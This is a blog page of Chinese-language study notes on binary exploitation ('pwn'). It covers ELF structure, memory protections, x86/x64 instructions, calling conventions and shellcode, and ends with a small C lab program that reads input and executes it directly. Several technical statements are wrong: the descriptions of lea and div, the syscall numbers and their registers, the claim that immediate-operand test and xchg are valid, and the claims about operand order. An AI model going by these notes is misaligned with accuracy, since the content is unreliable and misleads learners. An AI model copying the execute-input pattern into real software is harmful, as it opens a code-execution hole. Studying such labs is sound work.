<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>HackThe4O4</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Documenting the journey of cyber security">
<meta property="og:type" content="website">
<meta property="og:title" content="HackThe4O4">
<meta property="og:url" content="https://no-flag.com/page/3/index.html">
<meta property="og:site_name" content="HackThe4O4">
<meta property="og:description" content="Documenting the journey of cyber security">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Noflag">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="HackThe4O4" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/cat.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  


<meta name="generator" content="Hexo 7.3.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="/img/mela.gif" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/2024/12/21/hello-world/">About Me</a></li>
				        
							<li><a href="/archives">All articles</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/mela.gif" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/2024/12/21/hello-world/">About Me</a></li>
		        
					<li><a href="/archives">All articles</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="assem-PWN" class="article article-type-assem" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/PWN/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.091Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/PWN/">
        Pwn - Unleashing the Power of Exploits
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ktoVQB99Gj4">Pwn week1</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/u1f383/Software-Security-2021">https://github.com/u1f383/Software-Security-2021</a></p>
<p>Dockerfile build commend → docker build  . <em>–no-cache</em></p>
<h3 id="Binary-exploitation"><a href="#Binary-exploitation" class="headerlink" title="Binary exploitation"></a>Binary exploitation</h3><p>程式 &gt; 編譯產二進制<strong>執行檔案</strong></p>
<p>漏洞 &gt;程式出現與<strong>預期不同</strong>的行為，從而產生偏差，有些無關緊要，但有些能夠改變原要執行的動作或流程</p>
<p>pwn &gt;透過一或多個漏洞的利用，竄改執行流程，最終獲得程式的掌控權</p>
<ul>
<li>取得shell → 輸入指令操作程式</li>
<li>讀取、竄改檔案 → 讀取敏感或未經授權可讀取的檔案內容</li>
</ul>
<p><img src="/img/pwn_Untitled.png" alt="Untitled"></p>
<p>例子:</p>
<p><img src="/img/pwn_Untitled_1.png" alt="Untitled"></p>
<h3 id="ELF-→-Executable-and-Linkable-Format"><a href="#ELF-→-Executable-and-Linkable-Format" class="headerlink" title="ELF → Executable and Linkable Format"></a>ELF → Executable and Linkable Format</h3><p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/Hy9u21gap">pwn tool install</a></p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/BJ_Dpylp6">記憶體區塊</a></p>
<ul>
<li><p>像windows執行檔</p>
</li>
<li><p>Linux中所用的可執行檔案格式</p>
<ul>
<li><p>用Section區分不同功能資料</p>
</li>
<li><p>程式執行時函數的呼叫就會以 stack frame 的方式層層堆疊，也可以想成記憶體是一個直立式的櫃子、每個函數是一本一本的書籍，裡面記載了這個函數內的各種變數，當一個函數被呼叫時，就把這本書平放到櫃子中書堆的最上面，完成後再從書堆上拿下來。</p>
<p>  <img src="/img/pwn_Untitled_2.png" alt="Untitled"></p>
</li>
</ul>
<p>  <img src="/img/pwn_Untitled_3.png" alt="Untitled"></p>
<p>  <img src="/img/pwn_Untitled_4.png" alt="Untitled"></p>
<ul>
<li><p>不同功能需要不同權限、大小</p>
</li>
<li><p>程式碼屬於.text section會需要執行權限</p>
</li>
<li><p>常數字串屬於.rodata section 會需要讀取權限</p>
</li>
<li><p>section vs. segment</p>
<ul>
<li>section → 告訴linker 動態鏈結時需要的資料<ul>
<li>名稱表示資料的功能</li>
<li>是否需要被載入記憶體</li>
<li>只是用來描述其他屬性的metadata section</li>
</ul>
</li>
<li>segment → 告訴<strong>作業系統</strong>此程式被載入時的資訊<ul>
<li>相同權限的資料載入至相同的區塊</li>
<li>被載入到哪塊 virtual memory</li>
</ul>
</li>
</ul>
<p>  <img src="/img/pwn_Untitled_5.png" alt="Untitled"></p>
<p>  readelf 是一個可以pass整個elf結構的binary</p>
<p>  readelf -a filename</p>
<h3 id="Segment-→-readelf-l-test"><a href="#Segment-→-readelf-l-test" class="headerlink" title="Segment → readelf -l .&#x2F;test"></a>Segment → readelf -l .&#x2F;test</h3><ul>
<li>1-1紅色方框中是權限跟屬性</li>
<li>1-1綠色方框type → LOAD → 載入到記憶體當中</li>
<li>1-1粉色方框R、RE、RW → 對應屬性</li>
<li>1-2 紅色方框 Segment 包含哪些section</li>
<li>1-2 像是.interp、.note、.gnu.property..這些section為綠框的<strong>02 segment</strong>當中，他們都需要讀取的權限而已</li>
</ul>
<h3 id="Section-→-readelf-S-test"><a href="#Section-→-readelf-S-test" class="headerlink" title="Section → readelf -S .&#x2F;test"></a>Section → readelf -S .&#x2F;test</h3><ul>
<li>有些section單純放 比如說紅框中[ 2] .note.gnu.propert information(build-id or propert..)</li>
<li>[16] .test 為常見的section，這裡用來<strong>放程式碼</strong>，紀錄這段資料程式碼動態時屬性是PROGBITS，他必須要被載入到記憶體當中，<strong>載入後也需要執行權限</strong></li>
</ul>
<h3 id="ELF-Protection-保護機制"><a href="#ELF-Protection-保護機制" class="headerlink" title="ELF - Protection 保護機制"></a>ELF - Protection 保護機制</h3><p>  ELF (Executable and Linkable Format) 保護機制是一些技術，它們用於保護系統免受攻擊，或者對抗那些試圖破壞或逆向工程軟體的人。這些保護措施包括：</p>
<ul>
<li><p>PIE → Position-Independent Executable</p>
<ul>
<li>PIE 是一種保護機制，允許軟體在記憶體中的任何位置執行。這使得攻擊者<strong>更難推斷出程式的記憶體位址</strong>，因此使得程式更難被破壞。</li>
<li>程式碼會以<strong>相對位址</strong>的方式表示，而非絕對位址</li>
</ul>
</li>
<li><p>NX → No-eXecute</p>
<ul>
<li>NX 是一種記憶體保護機制，可<strong>防止未經授權的代碼執行</strong>。它通常用於保護**堆(Heap)和栈(Stack)**記憶體，以防止攻擊者插入恶意代碼，並從中執行。</li>
<li>保護機制之下.test之外的Section不會有執行權限</li>
</ul>
</li>
<li><p>Canary → Stack protector</p>
<ul>
<li>Canary 是一種記憶體保護機制，用於檢測攻擊者是否試圖破壞程式的堆或棧記憶體。它通常是<strong>通過在堆或棧記憶體中插入一個隨機值</strong>，並在程式<strong>執行期間</strong>經常檢查該值是否被修改來實現的。如果該值被修改，則可以推斷出有人試圖破壞記憶體，並采取適當的措施。</li>
</ul>
</li>
<li><p>RELRO → RELocation Rread-Only</p>
<ul>
<li>分成Full &#x2F; Partial &#x2F; No 三種型態，分別代表在Runtime解析外部Function時使用的不同機制</li>
<li>RELRO 是一種保護機制，用於保護程式的全局變量和函數位址不被修改。RELRO 通過在程式<strong>執行期間</strong>將這些變量和函數的位址<strong>設置為只讀</strong>，以防止攻擊者修改它們的值。</li>
</ul>
</li>
<li><p>Seccomp → secure computing mode</p>
<ul>
<li>制定規則來禁止&#x2F;允許呼叫特定的syscall</li>
<li>Seccomp 是一種 Linux 內核功能，用於<strong>限制程式執行時可以使用的系統呼叫</strong>。可以用來<strong>限制程式對系統的訪問</strong>，以防止攻擊者利用系統呼叫來破壞系統或獲得未授權的訪問。</li>
</ul>
</li>
<li><p>ASLR → Address Space Layout Randomization</p>
<ul>
<li><p>ASLR 是一種保護機制，用於<strong>隨機化程式在記憶體中的位址</strong>。這使得攻擊者更難推斷出程式的記憶體位址，因此使得程式更難被破壞。</p>
</li>
<li><p>程式載入時，stack、heap等記憶體區塊會使用<strong>隨機的位址</strong>作為base address</p>
<p>  <a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/HkiQTyxpa">記憶體結構</a></p>
<ul>
<li>在一定的範圍中隨機</li>
<li>未12bits是固定的，每次載入時都不會更動</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>  checksec 能看執行檔採用的安全防護</p>
<p>  <img src="/img/pwn_Untitled_6.png" alt="Untitled"></p>
<h3 id="x64-Basic"><a href="#x64-Basic" class="headerlink" title="x64 -Basic"></a>x64 -Basic</h3><p>  在x86指令集中，以”e”開頭的註冊通常是32位元註冊。例如，eax、ebx、ecx、edx、esi、edi等都是32位元註冊。</p>
<p>  在x86指令集中，還有一些64位元註冊以”r”開頭，例如rax、rbx、rcx、rdx、rsi、rdi等。</p>
<ul>
<li>Based on x86 的指令集</li>
<li>Logical address 用8bytes來代表，不過並不是整個記憶體位址都會使用到:<ul>
<li>User space -    0x0000<strong>0000</strong>0000<strong>0000</strong> (0) ~ 0x0000<strong>7FFF</strong>FFFF<strong>FFFF</strong> (2^47 - 1)</li>
<li>Kernel space - 0xFFFF<strong>8000</strong>0000<strong>0000</strong> (2^64 - 2^47) ~ 0xFFFF<strong>FFFF</strong>FFFF<strong>FFFF</strong> (2^64 - 1)</li>
</ul>
</li>
<li>原本x86 register 擴展到64 bits: rax, rbx, rcx, rdx, rsp, rbp, rip, …</li>
<li>比x86有更多的register: r8 ~ r15</li>
</ul>
<p>  rsp 的s→ stack , p→ pointr</p>
<p>  rbp2k</p>
<p>  x86 指令集包含許多不同的指令，用於執行各種各樣的操作。下面是一些常見的 x86 指令：</p>
<p>  <strong>在x86架構下，第一個操作數是後面的操作數，第二個操作數是前面的操作數。</strong></p>
<p>  通常情況下，第一個操作數是目標，第二個操作數是源。但是，有一些指令的操作數的順序與這個規則不同。</p>
<ul>
<li><p><code>mov</code>：將數據從一個地址<strong>移動</strong>到另一個地址。</p>
<ul>
<li><code>mov eax, 5</code>; 將數字5儲存到eax中<br>  <code>mov [ebx], eax</code>; 將eax的值存儲到ebx指向的地址中</li>
</ul>
</li>
<li><p><code>add</code>：將兩個數<strong>相加</strong>並將結果存儲回去。</p>
<ul>
<li><code>add eax, 5</code> ; 將eax的值<strong>加上</strong>数字5，結果存儲在eax中</li>
</ul>
</li>
<li><p><code>sub</code>：將兩個數<strong>相減</strong>並將結果存儲回去。</p>
<ul>
<li><code>sub eax, 5</code> ; 将eax的值<strong>減去</strong>数字5，結果存儲在eax中</li>
</ul>
</li>
<li><p><code>mul</code>：將兩個數<strong>相乘</strong>並將結果存儲回去。</p>
<ul>
<li><code>mul ebx</code> ; 将eax的值<strong>乘上</strong>ebx的值，結果存儲在eax中</li>
</ul>
</li>
<li><p><code>div</code>：將一個數<strong>除以</strong>另一個數並將結果存儲回去。</p>
<ul>
<li><code>div ebx</code> ; 將eax的值<strong>除以</strong>ebx的值，<strong>商存儲</strong>在eax中，<strong>餘數</strong>存儲在ebx中</li>
</ul>
</li>
<li><p><code>inc</code>：將<strong>數值加 1</strong>。</p>
<ul>
<li><code>inc eax</code> ; 将eax註冊的值加1</li>
</ul>
</li>
<li><p><code>dec</code>：將<strong>數值減 1</strong>。</p>
<ul>
<li><code>dec eax</code> ; 将eax註冊的值减1</li>
</ul>
</li>
<li><p><code>and</code>：將兩個數按位<strong>and</strong>並將結果存儲回去。</p>
<ul>
<li><code>and eax, ebx</code> ; 將eax註冊和ebx註冊的值進行<strong>邏輯與運算</strong>，結果存儲在eax中</li>
</ul>
</li>
<li><p><code>or</code>：將兩個數按位<strong>or</strong>併將結果存儲回去。</p>
<ul>
<li><code>or eax, ebx</code> ; 將eax註冊和ebx註冊的值進行<strong>邏輯與運算</strong>，結果存儲在eax中</li>
</ul>
</li>
<li><p><code>xor</code>：將兩個數按位<strong>互斥或</strong>併將結果存儲回去。</p>
<ul>
<li><code>xor eax, ebx</code> ; 將eax註冊和ebx註冊的值進行<strong>邏輯互斥或</strong>運算，結果存在eax中</li>
</ul>
</li>
<li><p><code>not</code>：將數值按位<strong>取反</strong>。</p>
<ul>
<li><code>not eax</code> ; 将eax註冊的值的每一位取反</li>
</ul>
</li>
<li><p><code>shl</code>：將數值<strong>左移</strong>一位（等價於乘以 2）。</p>
</li>
<li><p><code>shr</code>：將數值<strong>右移</strong>一位（等價於除以 2）。</p>
</li>
<li><p><code>push</code>：將數值<strong>推入堆棧頂</strong>。</p>
<ul>
<li><code>push eax</code> ; 将eax註冊的值压入堆栈中</li>
</ul>
</li>
<li><p><code>pop</code>：從<strong>堆棧頂彈出數</strong>值。</p>
<ul>
<li><code>pop ebx</code> ; 将堆栈頂部的數字弹出堆栈，並存儲到ebx註冊中</li>
</ul>
</li>
<li><p><code>call</code>：<strong>調用函數</strong>並將返回地址壓入堆棧。</p>
<ul>
<li><code>call function</code> ; 呼叫程序中名為”function”的函數。操作數的順序與通常情況下的規則相反。</li>
</ul>
</li>
<li><p><code>ret</code>：從<strong>堆棧中彈出</strong>返回地址並跳轉到該地址。</p>
</li>
<li><p><code>jmp</code>：<strong>無條件跳轉</strong>到指定地址。</p>
<ul>
<li><code>jmp label</code>; 跳轉到程序中名為”label”的位置。操作數的順序與通常情況下的規則相反。</li>
</ul>
</li>
<li><p><code>je</code>：如果<strong>相等</strong>則跳轉。</p>
</li>
<li><p><code>jne</code>：如果<strong>不相等</strong>則跳轉。</p>
</li>
<li><p><code>jg</code>：如果<strong>大於</strong>則跳轉。</p>
</li>
<li><p><code>jge</code>：如果<strong>大於等於</strong>則跳轉。</p>
</li>
<li><p><code>jl</code>：如果<strong>小於</strong>則跳轉。</p>
</li>
<li><p><code>jle</code>：如果<strong>小於等於</strong>則跳轉。</p>
</li>
<li><p><code>cmp</code>：<strong>比較兩個數</strong>並設置標誌位。兩數值不會被覆寫</p>
<ul>
<li><p><code>cmp eax, ebx</code> ; 比較eax註冊和ebx註冊的值的大小，設置一個標志</p>
</li>
<li><p>cmp指令是用於<strong>比較兩個數字的大小</strong>的指令。當兩個數字不等時，它會設置一個標志，這個標志可以用於<strong>控制程序流程</strong>。</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mov eax, <span class="number">5</span></span><br><span class="line">mov ebx, <span class="number">10</span></span><br><span class="line">cmp eax, ebx</span><br><span class="line"></span><br><span class="line">cmp指令的第一個操作數是eax，第二個操作數是ebx。</span><br><span class="line">cmp指令是比較eax和ebx的值的大小。在這個例子中，eax的值是<span class="number">5</span>，ebx的值是<span class="number">10</span>。</span><br><span class="line">因此，cmp指令會比較eax和ebx的值，並設置一個標志。</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>test</code>：比較兩個操作數的值的位元<strong>是否相同</strong>的指令，並設置標誌位。</p>
<ul>
<li><p><code>test eax, ebx</code>; test指令比較兩個操作數的值，並設置一個標志。操作數的順序與通常情況下的規則相反。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如，你可以使用以下命令來測試兩個數字的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">test 5, 10</span><br><span class="line"></span><br><span class="line">你也可以使用以下命令來測試兩個註冊的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">mov eax, 5</span><br><span class="line">mov ebx, 10</span><br><span class="line">test eax, ebx</span><br><span class="line"></span><br><span class="line">你還可以使用以下命令來測試兩個註冊指向的地址的值的位元是否相同:</span><br><span class="line"></span><br><span class="line">mov eax, [address1]</span><br><span class="line">mov ebx, [address2]</span><br><span class="line">test eax, ebx</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>lea</code>: <strong>獲取指针的地址或者獲取數組元素的地址</strong>，而不是用於計算數學運算。</p>
<ul>
<li><code>lea eax, [ebx]</code> ; lea指令會計算ebx指向的地址的值，並將該值存儲到eax註冊中。假設ebx註冊指向的地址存儲的值是100，那麼lea指令會將100存儲到eax註冊中。</li>
<li><code>lea eax, [ebx+4]</code>; lea指令會計算<strong>ebx指向的地址加上4</strong>的值，並將該值存儲到eax中。</li>
</ul>
</li>
<li><p><code>xchg</code>: 用於<strong>交換兩個操作數的值</strong>的指令。它的操作數的順序也與通常情況下的規則相反。</p>
<ul>
<li><p><code>xchg eax, ebx</code>;</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">例如，你可以使用以下命令來交換兩個數字的值:</span><br><span class="line"></span><br><span class="line">xchg 5, 10</span><br><span class="line"></span><br><span class="line">你也可以使用以下命令來交換兩個註冊的值:</span><br><span class="line"></span><br><span class="line">mov eax, 5</span><br><span class="line">mov ebx, 10</span><br><span class="line">xchg eax, ebx</span><br><span class="line"></span><br><span class="line">你還可以使用以下命令來交換兩個註冊指向的地址的值:</span><br><span class="line"></span><br><span class="line">mov eax, [address1]</span><br><span class="line">mov ebx, [address2]</span><br><span class="line">xchg eax, ebx</span><br><span class="line"></span><br><span class="line">xchg指令會交換eax和ebx註冊的值。</span><br><span class="line">在這個例子中，假設eax註冊的值是5，ebx註冊的值是10，</span><br><span class="line">那麼交換後，eax註冊的值將變為10，ebx註冊的值將變為5。</span><br><span class="line"></span><br><span class="line">在使用xchg指令時，你需要注意不要丟失重要的數據。</span><br><span class="line">例如，假設你正在使用xchg指令來交換兩個註冊的值，</span><br><span class="line">但是你忘記了將其中一個註冊的值存儲到其他地方，</span><br><span class="line">那麼你就有可能丟失重要的數據。</span><br><span class="line"></span><br><span class="line">此外，你需要注意xchg指令可能會影響程序的性能。</span><br><span class="line"></span><br><span class="line">例如，如果你的程序需要頻繁地交換兩個註冊的值，</span><br><span class="line">那麼使用xchg指令可能會降低程序的性能。</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>  label</p>
<ul>
<li>非必要</li>
<li>標籤至變數之前</li>
</ul>
<p>  資料標籤 data label</p>
<ul>
<li>標記一個變數位置</li>
<li>count DWORD 100</li>
</ul>
<p>  程式碼標籤</p>
<ul>
<li>必須以冒號(:)結尾</li>
</ul>
  <figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">L1:</span><br><span class="line">	add eax,<span class="number">1</span></span><br><span class="line">	jmp L1</span><br></pre></td></tr></table></figure>
<p>  Big&#x2F;Little Endian</p>
<p>  <img src="/img/pwn_Untitled_7.png" alt="Untitled"></p>
<h3 id="x64-Register"><a href="#x64-Register" class="headerlink" title="x64 - Register"></a>x64 - Register</h3><ul>
<li>rax → 存放 function 回傳的結果，可用於存儲函數的返回值或執行算術運算。</li>
<li>rsp → 指向 stack 的頂端，堆棧指針註冊</li>
<li>rbp → 指向 stack 底端，基準指針註冊，用於存儲當前函數的堆棧帧基準地址。</li>
<li>rip → 下個要執行的instruction位址，指令指針註冊，用於存儲當前執行的指令地址。</li>
</ul>
<p>  <img src="/img/pwn_Untitled_8.png" alt="Untitled"></p>
<h3 id="x64-Calling-Convention"><a href="#x64-Calling-Convention" class="headerlink" title="x64 - Calling Convention"></a>x64 - Calling Convention</h3><ul>
<li>可想像成是一種protocol，定義了:<ul>
<li><p>Function 如何傳遞參數</p>
</li>
<li><p>Syscall 如何傳遞參數</p>
<p>  <a target="_blank" rel="noopener" href="https://hackmd.io/@SY-T/BkTT3kgpa">stack frame</a></p>
<ul>
<li>Syscall是一個x86指令，<strong>它允許程序調用操作系統的服務</strong>。通常情況下，程序可以通過調用操作系統的服務來完成許多不同的操作，例如讀取文件、寫入文件、建立網絡連接等等。</li>
</ul>
<p>  使用Syscall指令時，你需要<strong>將系統调用的編號存儲在eax</strong>註冊中，<strong>然後調用Syscall指令</strong>。操作系統會根據eax註冊中的值來執行相應的服務。</p>
<p>  例如，你可以使用以下命令來調用操作系統的終止進程服務:</p>
<pre><code>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 1</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
  
  在這個例子中，**eax註冊的值是1，這表示調用終止進程服務**。當你調用Syscall指令時，操作系統會執行終止進程服務。
  
  此外，你還可以使用Syscall指令調用其他的操作系統服務。例如，你可以使用以下命令來調用操作系統的讀取文件服務:
  
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax, 2</span><br><span class="line">mov ebx, file_descriptor</span><br><span class="line">mov ecx, buffer</span><br><span class="line">mov edx, size</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
  
  在這個例子中，**eax註冊的值是2，這表示調用讀取文件服務**。其他的註冊（ebx、ecx、edx）存儲了讀取文件所需的參數。當你調用Syscall指令時，操作系統會執行讀取文件服務。
  
</code></pre>
</li>
<li><p>Caller 與 Callee各自的責任</p>
<p>  <img src="/img/pwn_Untitled_9.png" alt="Untitled"></p>
<p>  function call是一種程序語言中的語法，<strong>用於調用函數</strong>。函數是程序中的一段可<strong>重複使用的代碼</strong>，<strong>它可以被多個地方調用</strong>。函數可以接受參數，並且可以返回一個結果。他1~6個參數通過register傳遞，超過6個參數就會通過stack傳遞</p>
<p>  在x86中，function call調用的順序是先將函數的參數压入堆棧，然後將函數的地址压入堆棧，最後調用call指令跳轉到函數。</p>
<p>  例如，在C語言中，你可以使用以下語法調用函數:</p>
<p>  result &#x3D; function_name(arg1, arg2, …);</p>
<p>  在這個例子中，function_name是函數的名稱，arg1、arg2等是函數的參數，result是函數的返回值。</p>
<p>  Syscall是一個x86指令，它<strong>允許程序調用操作系統的服務</strong>。通常情況下，程序可以通過調用<strong>操作系統的服務來完成許多不同的操作</strong>，例如讀取文件、寫入文件、建立網統連接等等。</p>
<p>  使用Syscall指令時，你需要將系統调用的編號存儲在eax註冊中，然後調用Syscall指令。操作系統會根據eax註冊中的值來執行相應的服務。</p>
<p>  他會在rax放入一個syscall number，此外第四參數也跟fun call不一樣rcx→r10，其他都一樣</p>
</li>
<li><p>x64 registers sizes</p>
<ul>
<li>在 x86–64 結構下，暫存器都是 64 bits &#x3D; 8 bytes 大小<a target="_blank" rel="noopener" href="https://tech-blog.cymetrics.io/posts/crystal/reverse-01/#fn5">[5]</a><br>  ，暫存器也可以部分存取，以 <code>rax</code> 為例，<code>eax</code> 指 <code>rax</code> 的後 4 bytes、再對切得到 <code>ax</code> 為倒數 2 bytes、然後再切分為 <code>ah</code> 與 <code>al</code>。</li>
</ul>
<p>  <img src="/img/pwn_Untitled_10.png" alt="Untitled"></p>
<p>  <img src="/img/pwn_Untitled_11.png" alt="Untitled"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="x64-function-frame"><a href="#x64-function-frame" class="headerlink" title="x64 - function frame"></a>x64 - function frame</h3><p><img src="/img/pwn_Untitled_12.png" alt="Untitled"></p>
<ul>
<li>每個Function 在執行期間，stack中會有一塊空間負責記錄當前function的執行狀態，而該空間稱為Function frame，保存的狀態像是:<ul>
<li>當前function使用的變數</li>
<li>呼叫其他function時傳遞的參數</li>
</ul>
</li>
<li>Calling convention<ul>
<li>caller儲存回去的位址</li>
<li>callee儲存舊的function frame位址</li>
</ul>
</li>
</ul>
<p>x64 - Function frame - Prologue &#x2F; Epilogue</p>
<ul>
<li>在fun 的頭尾會有一些用來處理stack frame的指令<ul>
<li><p>頭: Prologue</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rbp</span><br><span class="line">mov rbp,rsp</span><br><span class="line">sub rsp,xxh</span><br></pre></td></tr></table></figure>
</li>
<li><p>尾: Epilogue</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">leave =&gt; mov rsp,rbp</span><br><span class="line">				 pop rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>Prologue是指<strong>函數執行前</strong>的一段代碼，它會負責<strong>建立堆棧帧並初始化所需的資訊</strong>。</p>
<p>在x64指令集中，Prologue通常會包含以下指令：</p>
<ul>
<li>push rbp: 將當前的rbp值压入堆棧</li>
<li>mov rbp, rsp: 將當前的rsp值複製到rbp中，作為新的基準地址</li>
<li>sub rsp, imm: 從rsp中減去一個數值，用來為局部變數預留空間</li>
</ul>
<p>Epilogue是指<strong>函數執行完畢</strong>後的一段代碼，它會負責<strong>清除堆棧帧並返回結果</strong>。</p>
<p>在x64指令集中，Epilogue通常會包含以下指令：</p>
<ul>
<li>mov rsp, rbp: 將rbp的值複製回rsp，恢復堆棧的狀態</li>
<li>pop rbp: 將堆棧頂端的值弹出，作為新的rbp值</li>
<li>ret: 返回至調用函數的地址</li>
</ul>
<p>Prologue和Epilogue是函數執行流程中不可或缺的部分，它們有助於<strong>保證函數的正確性和效率</strong>。</p>
<ul>
<li><p>補充</p>
<p>  rip → 下條要執行的指令</p>
</li>
</ul>
<p><img src="/img/pwn_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/pwn_x86_exec.drawio.png" alt="x86 exec.drawio.png"></p>
<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><ul>
<li>Explanation - 指攻擊者可以透過程式漏洞，將能控制到的data以指令的方式來執行<ul>
<li>Binary 為一連串的assembly instruction 組合而成，如果攻擊者可以再擁有<strong>執行+寫入</strong>權限的區段寫入一連串的instruction，控制執行流程到該區塊時<strong>就能執行shellcode</strong></li>
</ul>
</li>
<li>Precondition - 能控制到區塊的權限必須為rwx or -wx 才可寫入並執行</li>
</ul>
<p><img src="/img/pwn_Untitled_14.png" alt="Untitled"></p>
<ul>
<li>安裝pwntool</li>
<li>圖一中 asm是Python中的一個模塊，它可以將AT&amp;T格式的汇编語言代碼轉換為機器碼。這個模塊可以方便地在Python程序中使用汇编語言。</li>
<li>產生出的shellcode，在C建立chararray</li>
<li>func_ptr指向shellcode位址(sc)，用call func方式呼叫shellcode</li>
<li>gcc -z execstack -o test test.c</li>
</ul>
<h3 id="Shellcode-POC"><a href="#Shellcode-POC" class="headerlink" title="Shellcode POC"></a>Shellcode POC</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> shellcode[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me shellcode: &quot;</span>);</span><br><span class="line"></span><br><span class="line">    read(<span class="number">0</span>, shellcode, <span class="number">0x30</span>);</span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>setvbuf函数用于设置流的缓冲区，第一个参数指定要设置的流(stdin、stdout)，第二个参数指定缓冲区的内存地址，第三个参数指定缓冲区的类型(_IONBF)，第四个参数指定缓冲区的大小。</p>
<p>在这个程式中，<strong>setvbuf函数的第二个参数设置为0</strong>，这表示使用<strong>系统默认的缓冲区</strong>。第三个参数设置为**_IONBF<strong>，这表示设置为</strong>无缓冲类型<strong>，即直接输出到设备。第四个</strong>参数设置为0，<strong>这表示</strong>缓冲區大小为0<strong>，也就是</strong>禁用缓冲区<strong>。因此，這行程式的作用是将</strong>stdin流的缓冲区设置为无缓冲，即直接输出到设备**。</p>
<p>然后，程式定义了一个字符数组shellcode，大小为0x30(48)个字节。接着，使用printf函数向标准输出输出”Give me shellcode: “字符串。</p>
<p>最后，使用read函数从标准输入读入0x30(48)个字节的数据到shellcode数组中。然后，使用强制类型转换将shellcode数组转换为函数指针，并调用该函数。</p>
